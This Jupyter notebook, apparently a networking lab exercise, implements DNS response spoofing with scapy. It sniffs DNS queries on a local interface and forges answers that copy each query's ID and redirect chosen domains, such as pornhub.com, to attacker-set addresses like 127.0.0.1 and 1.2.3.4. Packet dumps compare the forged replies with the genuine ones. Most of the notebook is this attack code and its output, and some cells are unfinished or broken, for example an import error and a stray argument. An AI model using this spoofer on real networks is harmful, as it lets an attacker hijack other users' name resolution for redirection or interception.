{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.all import DNS, DNSQR, DNSRR, IP, IPv6, send, sniff, sr1, UDP, Ether\n",
    "import scapy.all"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "# 10.6.6.6,foo.example.com\n",
    "# 10.6.6.7,bar.example.com\n",
    "# 10.6.6.8,www.cs.uic.edu"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "hosts = {\n",
    "    \"foo.example.com\": \"10.6.6.6\",\n",
    "    \"bar.example.com\": \"10.6.6.7\",\n",
    "    \"www.cs.uic.edu\": \"10.6.6.8\",\n",
    "    \"pornhub.com\": \"127.0.0.1\"\n",
    "}\n",
    "pack = []"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'netfilterqueue'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-13-a1a60bd4baab>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0;32mfrom\u001b[0m \u001b[0mnetfilterqueue\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mNetfilterQueue\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mModuleNotFoundError\u001b[0m: No module named 'netfilterqueue'"
     ]
    }
   ],
   "source": [
    "from netfilterqueue import NetfilterQueue"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 232,
   "metadata": {
    "collapsed": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "###[ Ethernet ]### \n",
      "  dst       = 78:4f:43:72:e8:94\n",
      "  src       = 70:4f:b8:95:cc:cf\n",
      "  type      = IPv6\n",
      "###[ IPv6 ]### \n",
      "     version   = 6\n",
      "     tc        = 0\n",
      "     fl        = 0\n",
      "     plen      = None\n",
      "     nh        = UDP\n",
      "     hlim      = 64\n",
      "     src       = 2001:558:feed::1\n",
      "     dst       = 2601:241:8980:6b30:7050:da99:d291:7dcc\n",
      "###[ UDP ]### \n",
      "        sport     = domain\n",
      "        dport     = 59265\n",
      "        len       = None\n",
      "        chksum    = None\n",
      "###[ DNS ]### \n",
      "           id        = 55500\n",
      "           qr        = 1\n",
      "           opcode    = QUERY\n",
      "           aa        = 1\n",
      "           tc        = 0\n",
      "           rd        = 1\n",
      "           ra        = 0\n",
      "           z         = 0\n",
      "           ad        = 0\n",
      "           cd        = 0\n",
      "           rcode     = ok\n",
      "           qdcount   = 1\n",
      "           ancount   = 1\n",
      "           nscount   = 0\n",
      "           arcount   = 1\n",
      "           \\qd        \\\n",
      "            |###[ DNS Question Record ]### \n",
      "            |  qname     = 'pornhub.com.'\n",
      "            |  qtype     = A\n",
      "            |  qclass    = IN\n",
      "           \\an        \\\n",
      "            |###[ DNS Resource Record ]### \n",
      "            |  rrname    = 'pornhub.com.'\n",
      "            |  type      = A\n",
      "            |  rclass    = IN\n",
      "            |  ttl       = 0\n",
      "            |  rdlen     = None\n",
      "            |  rdata     = 127.0.0.1\n",
      "           ns        = None\n",
      "           \\ar        \\\n",
      "            |###[ DNS OPT Resource Record ]### \n",
      "            |  rrname    = '.'\n",
      "            |  type      = OPT\n",
      "            |  rclass    = 4096\n",
      "            |  extrcode  = 0\n",
      "            |  version   = 0\n",
      "            |  z         = 0\n",
      "            |  rdlen     = None\n",
      "            |  \\rdata     \\\n",
      "\n"
     ]
    }
   ],
   "source": [
    "pkt = pack[0]\n",
    "_IP = scapy.all.IP\n",
    "try:\n",
    "    pkt[IP]\n",
    "except IndexError:\n",
    "    _IP = scapy.all.IPv6\n",
    "\n",
    "cap_domain = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]\n",
    "fake = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) / _IP(src=pkt[_IP].dst, dst=pkt[_IP].src) / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,qr=1,ancount=1,ar=pkt[DNS].ar, an=DNSRR(rrname=pkt[DNSQR].qname,rdata=hosts[cap_domain]))\n",
    "fake.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "pornhub.com\n",
      "fake\n",
      "###[ Ethernet ]### \n",
      "  dst       = ff:ff:ff:ff:ff:ff\n",
      "  src       = 00:00:00:00:00:00\n",
      "  type      = IPv6\n",
      "###[ IPv6 ]### \n",
      "     version   = 6\n",
      "     tc        = 0\n",
      "     fl        = 0\n",
      "     plen      = None\n",
      "     nh        = UDP\n",
      "     hlim      = 64\n",
      "     src       = 2001:558:feed::1\n",
      "     dst       = 2601:241:8980:6b30:397f:e7c6:320b:a52\n",
      "###[ UDP ]### \n",
      "        sport     = domain\n",
      "        dport     = 59715\n",
      "        len       = None\n",
      "        chksum    = None\n",
      "###[ DNS ]### \n",
      "           id        = 9497\n",
      "           qr        = 1\n",
      "           opcode    = QUERY\n",
      "           aa        = 0\n",
      "           tc        = 0\n",
      "           rd        = 1\n",
      "           ra        = 0\n",
      "           z         = 0\n",
      "           ad        = 0\n",
      "           cd        = 0\n",
      "           rcode     = ok\n",
      "           qdcount   = 1\n",
      "           ancount   = 1\n",
      "           nscount   = 0\n",
      "           arcount   = 1\n",
      "           \\qd        \\\n",
      "            |###[ DNS Question Record ]### \n",
      "            |  qname     = 'pornhub.com.'\n",
      "            |  qtype     = A\n",
      "            |  qclass    = IN\n",
      "           \\an        \\\n",
      "            |###[ DNS Resource Record ]### \n",
      "            |  rrname    = 'pornhub.com.'\n",
      "            |  type      = A\n",
      "            |  rclass    = IN\n",
      "            |  ttl       = 10\n",
      "            |  rdlen     = None\n",
      "            |  rdata     = 127.0.0.1\n",
      "           ns        = None\n",
      "           ar        = None\n",
      "\n",
      "None\n",
      "\n",
      "Sent 1 packets.\n",
      "actual\n",
      "###[ Ethernet ]### \n",
      "  dst       = 78:4f:43:72:e8:94\n",
      "  src       = 70:4f:b8:95:cc:cf\n",
      "  type      = IPv6\n",
      "###[ IPv6 ]### \n",
      "     version   = 6\n",
      "     tc        = 0\n",
      "     fl        = 0\n",
      "     plen      = 64\n",
      "     nh        = UDP\n",
      "     hlim      = 58\n",
      "     src       = 2001:558:feed::1\n",
      "     dst       = 2601:241:8980:6b30:397f:e7c6:320b:a52\n",
      "###[ UDP ]### \n",
      "        sport     = domain\n",
      "        dport     = 59715\n",
      "        len       = 64\n",
      "        chksum    = 0xa558\n",
      "###[ DNS ]### \n",
      "           id        = 9497\n",
      "           qr        = 1\n",
      "           opcode    = QUERY\n",
      "           aa        = 0\n",
      "           tc        = 0\n",
      "           rd        = 1\n",
      "           ra        = 1\n",
      "           z         = 0\n",
      "           ad        = 0\n",
      "           cd        = 0\n",
      "           rcode     = ok\n",
      "           qdcount   = 1\n",
      "           ancount   = 1\n",
      "           nscount   = 0\n",
      "           arcount   = 1\n",
      "           \\qd        \\\n",
      "            |###[ DNS Question Record ]### \n",
      "            |  qname     = 'pornhub.com.'\n",
      "            |  qtype     = A\n",
      "            |  qclass    = IN\n",
      "           \\an        \\\n",
      "            |###[ DNS Resource Record ]### \n",
      "            |  rrname    = 'pornhub.com.'\n",
      "            |  type      = A\n",
      "            |  rclass    = IN\n",
      "            |  ttl       = 1567\n",
      "            |  rdlen     = None\n",
      "            |  rdata     = 66.254.114.41\n",
      "           ns        = None\n",
      "           \\ar        \\\n",
      "            |###[ DNS OPT Resource Record ]### \n",
      "            |  rrname    = '.'\n",
      "            |  type      = OPT\n",
      "            |  rclass    = 512\n",
      "            |  extrcode  = 0\n",
      "            |  version   = 0\n",
      "            |  z         = 0\n",
      "            |  rdlen     = None\n",
      "            |  \\rdata     \\\n",
      "\n",
      "None\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "<Sniffed: TCP:0 UDP:142 ICMP:0 Other:0>"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pack = []\n",
    "\n",
    "def isQuery(pkt):\n",
    "    pack.append(pkt)\n",
    "    domain = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]\n",
    "    \n",
    "    if (pkt[DNS].qr == 1 and domain in hosts):\n",
    "        print(\"actual\")\n",
    "        print(pkt.show())\n",
    "    \n",
    "    return pkt[DNS].qr == 0 and domain in hosts\n",
    "\n",
    "def dns_responder(pkt):\n",
    "    if (isQuery(pkt)):\n",
    "        cap_domain = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]\n",
    "        print(cap_domain)\n",
    "        \n",
    "        reply = Ether()/\\\n",
    "            IPv6(src=pkt.getlayer(1).dst, dst=pkt.getlayer(1).src)/\\\n",
    "            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\\\n",
    "            DNS(id=pkt.getlayer(2).id, aa=0, ra=1, qr=1, cd=0, qdcount=1, ancount=1, arcount=1,\n",
    "                qd=DNSQR(qname=pkt[DNSQR].qname, qtype='A', qclass=0x0001),\n",
    "                an=DNSRR(rrname=pkt.getlayer(2).qd.qname, rdata='127.0.0.1', ttl=10, type='A', rclass=0x0001),\n",
    "                ar\n",
    "               )\n",
    "        \n",
    "        print(\"fake\")\n",
    "        print(reply.show())\n",
    "        \n",
    "        send(reply, iface='en0')\n",
    "        return;\n",
    "        \n",
    "    \n",
    "        \n",
    "# sniff(iface=\"en0\", filter=\"port 53\", prn=lambda x: pack.append(x))\n",
    "# sniff(iface=\"en0\", filter=\"port 53\", prn=dns_responder)\n",
    "q = NetfilterQueue()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 231,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "###[ Ethernet ]### \n",
      "  dst       = 70:4f:b8:95:cc:cf\n",
      "  src       = 78:4f:43:72:e8:94\n",
      "  type      = IPv6\n",
      "###[ IPv6 ]### \n",
      "     version   = 6\n",
      "     tc        = 0\n",
      "     fl        = 769418\n",
      "     plen      = 48\n",
      "     nh        = UDP\n",
      "     hlim      = 64\n",
      "     src       = 2601:241:8980:6b30:7050:da99:d291:7dcc\n",
      "     dst       = 2001:558:feed::1\n",
      "###[ UDP ]### \n",
      "        sport     = 59265\n",
      "        dport     = domain\n",
      "        len       = 48\n",
      "        chksum    = 0x81be\n",
      "###[ DNS ]### \n",
      "           id        = 55500\n",
      "           qr        = 0\n",
      "           opcode    = QUERY\n",
      "           aa        = 0\n",
      "           tc        = 0\n",
      "           rd        = 1\n",
      "           ra        = 0\n",
      "           z         = 0\n",
      "           ad        = 1\n",
      "           cd        = 0\n",
      "           rcode     = ok\n",
      "           qdcount   = 1\n",
      "           ancount   = 0\n",
      "           nscount   = 0\n",
      "           arcount   = 1\n",
      "           \\qd        \\\n",
      "            |###[ DNS Question Record ]### \n",
      "            |  qname     = 'pornhub.com.'\n",
      "            |  qtype     = A\n",
      "            |  qclass    = IN\n",
      "           an        = None\n",
      "           ns        = None\n",
      "           \\ar        \\\n",
      "            |###[ DNS OPT Resource Record ]### \n",
      "            |  rrname    = '.'\n",
      "            |  type      = OPT\n",
      "            |  rclass    = 4096\n",
      "            |  extrcode  = 0\n",
      "            |  version   = 0\n",
      "            |  z         = 0\n",
      "            |  rdlen     = None\n",
      "            |  \\rdata     \\\n",
      "\n"
     ]
    }
   ],
   "source": [
    "pack[0].show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 215,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "###[ Ethernet ]### \n",
      "  dst       = 78:4f:43:72:e8:94\n",
      "  src       = 70:4f:b8:95:cc:cf\n",
      "  type      = IPv6\n",
      "###[ IPv6 ]### \n",
      "     version   = 6\n",
      "     tc        = 0\n",
      "     fl        = 0\n",
      "     plen      = 64\n",
      "     nh        = UDP\n",
      "     hlim      = 58\n",
      "     src       = 2001:558:feed::1\n",
      "     dst       = 2601:241:8980:6b30:7050:da99:d291:7dcc\n",
      "###[ UDP ]### \n",
      "        sport     = domain\n",
      "        dport     = 54072\n",
      "        len       = 64\n",
      "        chksum    = 0x10c3\n",
      "###[ DNS ]### \n",
      "           id        = 46092\n",
      "           qr        = 1\n",
      "           opcode    = QUERY\n",
      "           aa        = 0\n",
      "           tc        = 0\n",
      "           rd        = 1\n",
      "           ra        = 1\n",
      "           z         = 0\n",
      "           ad        = 0\n",
      "           cd        = 0\n",
      "           rcode     = ok\n",
      "           qdcount   = 1\n",
      "           ancount   = 1\n",
      "           nscount   = 0\n",
      "           arcount   = 1\n",
      "           \\qd        \\\n",
      "            |###[ DNS Question Record ]### \n",
      "            |  qname     = 'pornhub.com.'\n",
      "            |  qtype     = A\n",
      "            |  qclass    = IN\n",
      "           \\an        \\\n",
      "            |###[ DNS Resource Record ]### \n",
      "            |  rrname    = 'pornhub.com.'\n",
      "            |  type      = A\n",
      "            |  rclass    = IN\n",
      "            |  ttl       = 3581\n",
      "            |  rdlen     = None\n",
      "            |  rdata     = 66.254.114.41\n",
      "           ns        = None\n",
      "           \\ar        \\\n",
      "            |###[ DNS OPT Resource Record ]### \n",
      "            |  rrname    = '.'\n",
      "            |  type      = OPT\n",
      "            |  rclass    = 512\n",
      "            |  extrcode  = 0\n",
      "            |  version   = 0\n",
      "            |  z         = 0\n",
      "            |  rdlen     = None\n",
      "            |  \\rdata     \\\n",
      "\n"
     ]
    }
   ],
   "source": [
    "pack[1].show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 217,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "###[ Ethernet ]### \n",
      "  dst       = 78:4f:43:72:e8:94\n",
      "  src       = 70:4f:b8:95:cc:cf\n",
      "  type      = IPv6\n",
      "###[ IPv6 ]### \n",
      "     version   = 6\n",
      "     tc        = 0\n",
      "     fl        = 0\n",
      "     plen      = None\n",
      "     nh        = UDP\n",
      "     hlim      = 64\n",
      "     src       = 2001:558:feed::1\n",
      "     dst       = 2601:241:8980:6b30:7050:da99:d291:7dcc\n",
      "###[ UDP ]### \n",
      "        sport     = domain\n",
      "        dport     = 54072\n",
      "        len       = None\n",
      "        chksum    = None\n",
      "###[ DNS ]### \n",
      "           id        = 46092\n",
      "           qr        = 1\n",
      "           opcode    = QUERY\n",
      "           aa        = 1\n",
      "           tc        = 0\n",
      "           rd        = 1\n",
      "           ra        = 0\n",
      "           z         = 0\n",
      "           ad        = 0\n",
      "           cd        = 0\n",
      "           rcode     = ok\n",
      "           qdcount   = 1\n",
      "           ancount   = 1\n",
      "           nscount   = 0\n",
      "           arcount   = 1\n",
      "           \\qd        \\\n",
      "            |###[ DNS Question Record ]### \n",
      "            |  qname     = 'pornhub.com.'\n",
      "            |  qtype     = A\n",
      "            |  qclass    = IN\n",
      "           \\an        \\\n",
      "            |###[ DNS Resource Record ]### \n",
      "            |  rrname    = 'pornhub.com.'\n",
      "            |  type      = A\n",
      "            |  rclass    = IN\n",
      "            |  ttl       = 0\n",
      "            |  rdlen     = None\n",
      "            |  rdata     = 1.2.3.4\n",
      "           ns        = None\n",
      "           \\ar        \\\n",
      "            |###[ DNS OPT Resource Record ]### \n",
      "            |  rrname    = '.'\n",
      "            |  type      = OPT\n",
      "            |  rclass    = 4096\n",
      "            |  extrcode  = 0\n",
      "            |  version   = 0\n",
      "            |  z         = 0\n",
      "            |  rdlen     = None\n",
      "            |  \\rdata     \\\n",
      "\n"
     ]
    }
   ],
   "source": [
    "pkt = pack[0]\n",
    "_IP = scapy.all.IP\n",
    "try:\n",
    "    pkt[IP]\n",
    "except IndexError:\n",
    "    _IP = scapy.all.IPv6\n",
    "\n",
    "cap_domain = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]\n",
    "fake = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) / _IP(src=pkt[_IP].dst, dst=pkt[_IP].src) / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,qr=1,ancount=1,ar=pkt[DNS].ar, an=DNSRR(rrname=pkt[DNSQR].qname,rdata=hosts[cap_domain]))\n",
    "fake.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 206,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'pornhub.com'"
      ]
     },
     "execution_count": 206,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'70:4f:b8:95:cc:aa'"
      ]
     },
     "execution_count": 78,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pack[0].getlayer(0).dst"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<IPv6  version=6 tc=0 fl=927790 plen=48 nh=UDP hlim=64 src=2601:241:8980:6b30:7050:da99:d291:7dcc dst=2001:558:feed::1 |<UDP  sport=57776 dport=domain len=48 chksum=0x2bf6 |<DNS  id=13414 qr=0 opcode=QUERY aa=0 tc=0 rd=1 ra=0 z=0 ad=1 cd=0 rcode=ok qdcount=1 ancount=0 nscount=0 arcount=1 qd=<DNSQR  qname='pornhub.com.' qtype=A qclass=IN |> an=None ns=None ar=<DNSRROPT  rrname='.' type=OPT rclass=4096 extrcode=0 version=0 z=0 rdlen=None |> |>>>"
      ]
     },
     "execution_count": 140,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "copy[IPv6]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
